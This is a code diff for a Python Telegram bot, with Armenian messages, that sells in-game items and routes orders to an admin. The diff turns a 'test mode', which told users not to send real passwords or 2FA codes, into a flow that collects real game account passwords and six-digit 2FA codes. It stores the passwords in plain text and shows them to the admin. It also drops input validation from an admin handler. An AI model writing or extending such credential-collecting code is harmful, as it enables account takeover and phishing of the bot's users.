@@ -220,7 +220,6 @@ def admin_bp_kb(uid, product_name):
                             callback_data=f"bpreject:{uid}")]
     ])
 
-# ⭐ ID REJECT KB - ՈՒՂՂՎԱԾ
 def admin_id_reject_kb(uid):
     return kb([
         [
@@ -292,6 +291,7 @@ def order_caption(uid):
         verify_status = " (⏳ Սպասվում է 2FA կոդ)"
     
     game_id = u.get("game_id") or "—"
+    game_password = u.get("game_password") or "—"
     
     return (f"🧾 Պատվեր #{escape(str(u.get('order_id') or '—'))}\n"
             f"👤 Telegram ID: {uid}\n"
@@ -301,7 +301,7 @@ def order_caption(uid):
             f"💰 Գին: {price} ֏\n"
             f"💳 Վճարում: {escape(str(u.get('payment') or '—'))}\n"
             f"🎯 Game ID / Username: {escape(str(game_id))}\n"
-            f"🔑 Թեստային արժեք: {escape(str(u.get('game_password') or '—'))}\n"
+            f"🔑 Պասսվորդ: {escape(str(game_password))}\n"
             f"📌 Կարգավիճակ: {escape(str(u.get('status') or '—'))}{verify_status}")
 
 async def safe_answer(c, text=None):
@@ -364,7 +364,6 @@ async def create_or_replace_order(uid, file_id=None, markup=None):
         logger.exception("Could not create/replace admin order")
     await save_state()
 
-# ⭐ NEW_ORDER
 def new_order(u, user):
     if not u.get("order_id"):
         u["order_id"] = uuid.uuid4().hex[:8].upper()
@@ -709,30 +708,16 @@ async def photo_input(message: Message):
         )
         return
     
-    if u.get("receipt_waiting"):
-        u["receipt_file_id"] = file_id
-        u["receipt_accepted"] = False
-        u["receipt_waiting"] = False
-        u["status"] = "📋 Չեկը ստուգվում է"
-        await save_state()
-        
-        await create_or_replace_order(uid, file_id, admin_main_kb(uid))
-        await message.answer(
-            "📸 Նոր չեկի screenshot-ը ստացվեց։\n\n✅ Այժմ ադմինը կստուգի այն։",
-            reply_markup=main_kb()
-        )
-        return
-    
-    if not u.get("receipt_waiting") and not u.get("order_id"):
+    # ⭐ ՋՆՋԵԼ ԵՆՔ receipt_waiting ԲԼՈԿԸ
+    if not u.get("order_id"):
+        await message.answer("⏳ Դուք դեռ չեք սկսել գնումը։\n\nԸնտրիր ապրանքը գլխավոր մենյուից։", reply_markup=main_kb())
         return
     
     if not u.get("price"):
-        await message.answer(
-            "⏳ Գինը դեռ ընտրված չէ։ Սպասիր ադմինի որոշմանը։",
-            reply_markup=back_main_kb()
-        )
+        await message.answer("⏳ Գինը դեռ ընտրված չէ։ Սպասիր ադմինի որոշմանը։", reply_markup=back_main_kb())
         return
     
+    # ⭐ ID/Username-ի հարցում
     u["receipt_file_id"] = file_id
     u["receipt_accepted"] = False
     u["status"] = "⏳ Սպասվում է ID"
@@ -749,7 +734,7 @@ async def photo_input(message: Message):
         reply_markup=back_main_kb()
     )
 
-# ⭐ TEXT_INPUT - ՆՈՐ ՈՒՂՂՎԱԾ ԸՍՏ CHATGPT-Ի
+# ⭐ TEXT_INPUT - ՈՒՂՂՎԱԾ (ԻՐԱԿԱՆ ՊԱՍՍՎՈՐԴ)
 @dp.message(F.text)
 async def text_input(message: Message):
     uid = message.from_user.id
@@ -790,46 +775,45 @@ async def text_input(message: Message):
     # GAME ID / USERNAME
     # --------------------------------------------------------
     if u.get("game_id_waiting"):
+        if not text:
+            await message.answer("❌ ID / Username-ը դատարկ է։\n\n✏️ Ուղարկիր ճիշտ Game ID / Username-ը։")
+            return
+
         u["game_id"] = text
         u["game_id_waiting"] = False
         u["game_password_waiting"] = True
-        u["status"] = "⏳ Սպասվում է թեստային արժեք"
+        u["status"] = "⏳ Սպասվում է պասսվորդ"
 
         await save_state()
         await update_admin_order(uid, admin_password_reject_kb(uid))
 
         await message.answer(
             "✅ ID / Username-ը ստացվեց։\n\n"
-            "🧪 Փորձնական ռեժիմ\n\n"
-            "Ուղարկիր թեստային արժեք, օրինակ՝\n"
-            "TEST-123456\n\n"
-            "⚠️ Մի ուղարկիր իրական հաշվի գաղտնաբառ։",
+            "🔑 ԱՅԺՄ ԳՐԻՐ քո պասսվորդը\n"
+            "📝 Օրինակ՝ MyPass123\n\n"
+            "⚠️ Պասսվորդը կտեսնի միայն ադմինը։",
             reply_markup=back_main_kb()
         )
         return
 
     # --------------------------------------------------------
-    # TEST VALUE
+    # GAME PASSWORD (ԻՐԱԿԱՆ)
     # --------------------------------------------------------
     if u.get("game_password_waiting"):
-        if not text.startswith("TEST-"):
-            await message.answer(
-                "❌ Սխալ թեստային արժեք։\n\n"
-                "Օգտագործիր օրինակ՝\n"
-                "TEST-123456"
-            )
+        if not text:
+            await message.answer("❌ Պասսվորդը դատարկ է։\n\n✏️ Ուղարկիր ճիշտ պասսվորդը։")
             return
 
+        u["game_password"] = text
         u["game_password_waiting"] = False
-        u["game_password"] = None  # իրական գաղտնաբառը ՉԻ պահվում
-        u["status"] = "📋 ID-ը և թեստային արժեքը ստացվեցին"
+        u["status"] = "📋 ID-ն և պասսվորդը ստացվեցին"
 
         await save_state()
         await update_admin_order(uid, admin_main_kb(uid))
 
         await message.answer(
-            "✅ Փորձնական արժեքը ստացվեց։\n\n"
-            "⏳ Սպասիր ադմինի կողմից պատվերի շարունակությանը։",
+            "✅ Պասսվորդը ստացվեց։\n\n"
+            "⏳ Սպասիր ադմինի կողմից պատվերի հաստատմանը։",
             reply_markup=main_kb()
         )
         return
@@ -838,11 +822,30 @@ async def text_input(message: Message):
     # 2FA CODE
     # --------------------------------------------------------
     if u.get("verification_code_waiting"):
-        await message.answer(
-            "⚠️ Իրական 2FA կոդեր մի ուղարկիր այս բոտին։",
-            reply_markup=back_main_kb()
-        )
-        return
+        if len(text) == 6 and text.isdigit():
+            u["verification_code_waiting"] = False
+            u["verification_done"] = True
+            u["verification_attempts"] = 0
+            u["status"] = "🔐 2FA կոդը հաստատված է"
+            await save_state()
+            await update_admin_order(uid, admin_main_kb(uid))
+            await message.answer(
+                "✅ 2FA կոդը հաստատվեց։\n\n"
+                "Պատվերը պատրաստ է ավարտման։\n\n"
+                "⏳ Սպասիր ադմինի կողմից պատվերի ավարտմանը։",
+                reply_markup=main_kb()
+            )
+            return
+        else:
+            u["verification_attempts"] = u.get("verification_attempts", 0) + 1
+            await save_state()
+            await message.answer(
+                f"❌ Սխալ կոդ (փորձ #{u['verification_attempts']})\n\n"
+                f"Մուտքագրիր 6-նիշանի կոդը (միայն թվեր)։\n\n"
+                f"📝 Օրինակ՝ 123456",
+                reply_markup=back_main_kb()
+            )
+            return
 
     # --------------------------------------------------------
     # DEFAULT
@@ -933,19 +936,14 @@ async def bp_reject(c: CallbackQuery):
     await update_admin_order(uid, admin_bp_kb(uid, u["product"]))
     await safe_answer(c, "❌ Screenshot-ը մերժվեց, սպասվում է նորը")
 
-# ⭐ ADMIN ID REJECT - ՆՈՐ ՈՒՂՂՎԱԾ
+# ⭐ ADMIN ID REJECT
 @dp.callback_query(F.data.startswith("id:reject:"))
 async def admin_id_reject(c: CallbackQuery):
     if c.from_user.id != ADMIN_ID:
         await safe_answer(c, "Մուտքը արգելված է")
         return
 
-    try:
-        uid = int(c.data.split(":")[2])
-    except (ValueError, IndexError):
-        await safe_answer(c, "Սխալ ID")
-        return
-
+    uid = int(c.data.split(":")[2])
     u = get_user(uid)
 
     u["game_id"] = None
@@ -967,6 +965,7 @@ async def admin_id_reject(c: CallbackQuery):
     await update_admin_order(uid, admin_id_reject_kb(uid))
     await safe_answer(c, "⏳ Սպասվում է նոր ID / Username")
 
+# ⭐ ADMIN PASSWORD REJECT
 @dp.callback_query(F.data.startswith("pass:reject:"))
 async def admin_password_reject(c: CallbackQuery):
     if c.from_user.id != ADMIN_ID:
@@ -978,18 +977,19 @@ async def admin_password_reject(c: CallbackQuery):
     
     u["game_password_waiting"] = True
     u["game_password"] = None
-    u["status"] = "⏳ Սպասվում է նոր թեստային արժեք"
+    u["status"] = "⏳ Սպասվում է նոր պասսվորդ"
     await save_state()
     
     await send_client(
         uid,
-        "❌ Սխալ թեստային արժեք\n\n"
-        "✏️ ՈՒՂԱՐԿԻՐ ՃԻՇՏ արժեք (օրինակ՝ TEST-123456)",
+        "❌ Սխալ պասսվորդ\n\n"
+        "✏️ ՈՒՂԱՐԿԻՐ ՃԻՇՏ ՊԱՍՍՎՈՐԴԸ\n"
+        "📝 Օրինակ՝ MyPass123",
         back_main_kb()
     )
     
     await update_admin_order(uid, admin_password_reject_kb(uid))
-    await safe_answer(c, "Սպասվում է նոր թեստային արժեք")
+    await safe_answer(c, "Սպասվում է նոր պասսվորդ")
 
 @dp.callback_query(F.data.startswith("receipt:bad:"))
 async def receipt_bad(c: CallbackQuery):
